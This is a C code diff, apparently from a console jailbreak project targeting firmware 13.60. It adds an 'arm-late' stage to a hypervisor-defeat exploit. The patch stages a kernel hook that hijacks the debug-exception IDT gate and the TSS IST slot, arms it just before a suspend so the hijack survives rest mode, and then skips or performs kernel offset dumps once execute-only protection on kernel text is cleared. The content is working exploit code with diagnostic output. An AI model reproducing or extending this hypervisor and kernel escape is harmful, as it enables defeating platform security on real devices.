@@ -103,6 +103,10 @@ extern unsigned int takeover_bin_len;
 static uint64_t g_oracle;
 static uint64_t g_payload_va;
 static int g_armed;
+/* P4.4b: arm-late. The hook is staged early but only armed just before the
+ * suspend, so the #DB hijack lives across the sleep and nothing else. */
+static khook_t g_hook;
+static int g_hook_valid;
 static int g_redirected;
 
 #ifdef PL5_OFFSETS_MODE
@@ -507,17 +511,31 @@ static int install_resume_hook(uint64_t cave_addr, int redirect) {
     return -1;
   }
 
+#if PL5_DIAG == 18
+  /* arm-late: stage everything, but keep the #DB gate and the IST slot out of
+   * it; kh_arm() writes those right before the standby request. */
+  kh_diag_skip_mask = KH_SKIP_IST | KH_SKIP_GATE;
+  notify("13.60: P4 diag18: staging only (gate+IST deferred to arm-late)\n");
+#else
+  kh_diag_skip_mask = kh_diag_skip_mask; /* set by the diag stages above */
+#endif
   ret = kh_install(&hook, &chain);
   notify("13.60: [D] kh_install rc=%d\n", ret);
   if (ret)
     return ret;
+#if PL5_DIAG == 18
+  g_hook = hook;
+  g_hook_valid = 1;
+#endif
 
   pin_to_core(HOOK_CORE);
   notify("13.60: [E] core=%d ktext=%#lx scratch=%#lx tgt=%#lx idt=%#lx tss=%#lx\n",
          sceKernelGetCurrentCpu(), (unsigned long)ktext, (unsigned long)scratch,
          (unsigned long)hook.hook_kaddr, (unsigned long)hook.idt_base,
          (unsigned long)hook.tss_base);
-#if PL5_DIAG == 16
+#if PL5_DIAG == 18
+  notify("13.60: P4 diag18: self-test trigger deferred to arm-late\n");
+#elif PL5_DIAG == 16
   notify("13.60: P4 diag16: kh_trigger SKIPPED (gate+IST swapped, never exercised)\n");
 #else
   kh_trigger(&hook);
@@ -551,6 +569,23 @@ static int install_resume_hook(uint64_t cave_addr, int redirect) {
  * only built with PL5_1360_TAKEOVER=1) or report the escape and return with the
  * console resumed and HV defeated.
  */
+/* P4.4b: arm the staged hook (writes the TSS IST slot + the #DB IDT gate). */
+int hv_defeat_1360_arm(void)
+{
+#if PL5_DIAG == 18
+  int rc;
+  if (!g_hook_valid) {
+    notify("13.60: arm-late: no staged hook\n");
+    return -1;
+  }
+  rc = kh_arm(&g_hook);
+  notify("13.60: arm-late: kh_arm rc=%d (gate+IST written now)\n", rc);
+  return rc;
+#else
+  return -1;
+#endif
+}
+
 int hv_defeat_1360_post_resume(void) {
   uint64_t cookie = 0;
 
@@ -606,12 +641,20 @@ int hv_defeat_1360_post_resume(void) {
   notify("13.60: [W+] post-wake settling done (diag=%d).\n", PL5_DIAG);
 
 #ifdef PL5_OFFSETS_MODE
+# if PL5_DIAG == 18
+  /* P4.4b arm-late test: do NOT dump offsets here. Reading kernel .text powers
+   * this console off, which would confound the measurement -- we only want to
+   * know whether arm-late survives the rest-mode cycle. */
+  notify("13.60: P4 diag18: post-resume reached; dump SKIPPED on purpose.\n");
+  return 0;
+# else
   /* Offsets-dump payload: the escape + resume have cleared XOM on kernel .text,
    * so dump the offsets and stop -- no post-resume takeover / Linux boot. */
   notify("13.60: HV defeated; dumping offsets...\n");
   pl5_dump_offsets();
   notify("13.60: offset dump complete.\n");
   return 0;
+# endif
 #endif
 
 #if PL5_DIAG < 3
@@ -808,12 +851,21 @@ int hv_defeat_1360(void *shellcode_kernel, size_t shellcode_kernel_len) {
     int text_open = (find_pte(pm, ktext, &e) != 0xFFFFFFFFFFFFFFFFull) &&
                     (PDE_FIELD(e, XOTEXT) == 0);
     if (text_open) {
+#if PL5_DIAG >= 10
+      /* P4 diagnostics must not inherit state: an earlier run can leave the
+       * cave's ARMED mark set, and adopting it would skip the install this
+       * stage is supposed to perform (measured: diag18 reported "no staged
+       * hook" because diag17 had armed it minutes earlier). */
+      notify("13.60: P4 diag=%d: ignoring the adopted armed mark; forcing the escape.\n",
+             PL5_DIAG);
+#else
       g_oracle = cave_addr + KH_OFF_USER;
       g_payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
       g_armed = 1;
       g_redirected = 1;
       notify("13.60: hook armed and .text already open; adopting it.\n");
       return 0;
+#endif
     }
     notify("13.60: stale armed mark (.text still execute-only); running escape.\n");
   }
